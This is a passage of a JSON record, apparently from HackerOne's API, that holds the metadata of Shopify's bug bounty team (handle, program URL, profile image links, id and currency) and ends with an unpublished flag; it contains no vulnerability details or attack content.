        "handle": "shopify", 
        "url": "https://hackerone.com/shopify", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1382, 
        "default_currency": "usd"
    }, 
    "is_published": false
}